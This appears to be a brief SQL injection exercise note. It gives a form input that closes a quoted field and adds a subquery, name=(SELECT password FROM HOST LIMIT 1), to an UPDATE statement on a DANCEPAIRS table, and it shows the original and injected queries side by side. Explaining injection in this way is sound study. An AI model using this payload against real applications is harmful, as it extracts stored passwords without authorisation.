# => 1
Name => ', name=(SELECT password FROM HOST LIMIT 1)--
Partner => test



ORIGINAL QUERY
UPDATE DANCEPAIRS SET partner='test', name='<your_input>' WHERE id=1

INJECTED QUERY 
UPDATE DANCEPAIRS 
SET partner='test', 
    name='', 
    name=(SELECT password FROM HOST LIMIT 1)-- 
WHERE id=1